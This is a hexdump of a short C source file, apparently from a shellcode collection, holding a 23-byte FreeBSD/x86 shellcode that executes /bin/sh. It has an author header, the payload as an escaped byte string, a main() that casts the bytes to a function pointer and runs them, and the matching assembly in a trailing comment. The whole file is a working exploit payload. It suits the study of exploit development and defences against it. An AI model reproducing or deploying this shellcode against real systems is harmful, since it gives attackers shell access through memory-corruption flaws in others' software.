00000000  2f 2a 0d 0a 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*.. -----------|
00000010  2d 2d 2d 20 46 72 65 65  42 53 44 2f 78 38 36 20  |--- FreeBSD/x86 |
00000020  2d 20 65 78 65 63 76 28  22 2f 62 69 6e 2f 73 68  |- execv("/bin/sh|
00000030  22 29 20 32 33 20 62 79  74 65 73 20 2d 2d 2d 2d  |") 23 bytes ----|
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000050  2d 2d 2d 2d 2d 0d 0a 20  2a 20 20 41 55 54 48 4f  |-----.. *  AUTHO|
00000060  52 20 3a 20 54 6f 73 68  0d 0a 20 2a 20 20 20 4f  |R : Tosh.. *   O|
00000070  53 20 20 20 20 3a 20 42  53 44 78 38 36 20 28 54  |S    : BSDx86 (T|
00000080  65 73 74 65 64 20 6f 6e  20 46 72 65 65 42 53 44  |ested on FreeBSD|
00000090  20 38 2e 31 29 0d 0a 20  2a 20 20 20 45 4d 41 49  | 8.1).. *   EMAI|
000000a0  4c 20 3a 20 74 6f 73 68  40 74 75 78 66 61 6d 69  |L : tosh@tuxfami|
000000b0  6c 79 2e 6f 72 67 0d 0a  20 2a 2f 0d 0a 0d 0a 23  |ly.org.. */....#|
000000c0  69 6e 63 6c 75 64 65 20  3c 73 74 72 69 6e 67 2e  |include <string.|
000000d0  68 3e 0d 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |h>..#include <st|
000000e0  64 69 6f 2e 68 3e 0d 0a  0d 0a 0d 0a 0d 0a 63 68  |dio.h>........ch|
000000f0  61 72 20 73 68 65 6c 6c  63 6f 64 65 5b 5d 20 3d  |ar shellcode[] =|
00000100  20 22 5c 78 33 31 5c 78  63 30 5c 78 35 30 5c 78  | "\x31\xc0\x50\x|
00000110  36 38 5c 78 32 66 5c 78  32 66 5c 78 37 33 5c 78  |68\x2f\x2f\x73\x|
00000120  36 38 22 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |68"..           |
00000130  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 32  |        "\x68\x2|
00000140  66 5c 78 36 32 5c 78 36  39 5c 78 36 65 5c 78 38  |f\x62\x69\x6e\x8|
00000150  39 5c 78 65 33 5c 78 35  30 22 0d 0a 20 20 20 20  |9\xe3\x50"..    |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
00000170  5c 78 35 34 5c 78 35 33  5c 78 62 30 5c 78 33 62  |\x54\x53\xb0\x3b|
00000180  5c 78 35 30 5c 78 63 64  5c 78 38 30 22 3b 0d 0a  |\x50\xcd\x80";..|
00000190  0d 0a 69 6e 74 20 6d 61  69 6e 28 76 6f 69 64 29  |..int main(void)|
000001a0  0d 0a 7b 0d 0a 20 20 20  76 6f 69 64 28 2a 66 29  |..{..   void(*f)|
000001b0  28 29 20 3d 20 28 76 6f  69 64 2a 29 73 68 65 6c  |() = (void*)shel|
000001c0  6c 63 6f 64 65 3b 0d 0a  0d 0a 20 20 20 70 72 69  |lcode;....   pri|
000001d0  6e 74 66 28 22 4c 65 6e  20 3d 20 25 64 5c 6e 22  |ntf("Len = %d\n"|
000001e0  2c 20 73 69 7a 65 6f 66  28 73 68 65 6c 6c 63 6f  |, sizeof(shellco|
000001f0  64 65 29 2d 31 29 3b 0d  0a 20 20 20 66 28 29 3b  |de)-1);..   f();|
00000200  0d 0a 7d 0d 0a 0d 0a 2f  2a 21 0d 0a 20 25 64 65  |..}..../*!.. %de|
00000210  66 69 6e 65 20 53 59 53  5f 45 58 45 43 56 20 35  |fine SYS_EXECV 5|
00000220  39 0d 0a 0d 0a 0d 0a 73  65 63 74 69 6f 6e 20 2e  |9......section .|
00000230  74 65 78 74 0d 0a 0d 0a  67 6c 6f 62 61 6c 20 5f  |text....global _|
00000240  73 74 61 72 74 0d 0a 0d  0a 5f 73 74 61 72 74 3a  |start...._start:|
00000250  0d 0a 20 20 20 78 6f 72  20 65 61 78 2c 20 65 61  |..   xor eax, ea|
00000260  78 0d 0a 0d 0a 20 20 20  70 75 73 68 20 65 61 78  |x....   push eax|
00000270  0d 0a 0d 0a 20 20 20 70  75 73 68 20 27 2f 2f 73  |....   push '//s|
00000280  68 27 0d 0a 20 20 20 70  75 73 68 20 27 2f 62 69  |h'..   push '/bi|
00000290  6e 27 0d 0a 0d 0a 20 20  20 6d 6f 76 20 65 62 78  |n'....   mov ebx|
000002a0  2c 20 65 73 70 0d 0a 0d  0a 20 20 20 70 75 73 68  |, esp....   push|
000002b0  20 65 61 78 0d 0a 20 20  20 70 75 73 68 20 65 73  | eax..   push es|
000002c0  70 0d 0a 20 20 20 70 75  73 68 20 65 62 78 0d 0a  |p..   push ebx..|
000002d0  20 20 20 6d 6f 76 20 61  6c 2c 20 53 59 53 5f 45  |   mov al, SYS_E|
000002e0  58 45 43 56 0d 0a 20 20  20 70 75 73 68 20 65 61  |XECV..   push ea|
000002f0  78 0d 0a 20 20 20 69 6e  74 20 30 78 38 30 0d 0a  |x..   int 0x80..|
00000300  2a 2f                                             |*/|
00000302
